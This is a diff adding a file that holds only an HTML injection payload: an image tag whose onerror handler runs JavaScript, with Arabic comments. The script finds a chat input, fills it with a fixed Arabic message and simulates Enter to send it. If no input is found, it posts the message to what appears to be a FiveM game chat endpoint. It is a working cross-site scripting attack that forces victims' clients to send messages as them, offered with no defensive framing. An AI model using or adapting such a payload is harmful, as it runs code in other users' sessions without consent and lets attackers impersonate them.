@@ -1,0 +1,27 @@
+<img src="x" onerror="
+    // محاولة إيجاد مربع الكتابة بتاع الشات
+    let chatInput = document.querySelector('input[type=\'text\']') || document.querySelector('.chat-input') || document.querySelector('textarea');
+    
+    if(chatInput) {
+        // لو لقينا المربع، نكتب فيه ونبعت
+        chatInput.value = 'فولفو اسرع سياره';
+        chatInput.dispatchEvent(new Event('input', { bubbles: true }));
+        
+        // نحاول نبعت الرسالة (محاكاة ضغط Enter)
+        let enterEvent = new KeyboardEvent('keydown', {
+            key: 'Enter',
+            code: 'Enter',
+            keyCode: 13,
+            which: 13,
+            bubbles: true
+        });
+        chatInput.dispatchEvent(enterEvent);
+    } else {
+        // لو ملقيناش المربع، نستخدم الطريقة القديمة كخطة بديلة
+        fetch('https://cfx-nui-chat/chat:sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: 'فولفو اسرع سياره' })
+        }).catch(()=>{});
+    }
+">
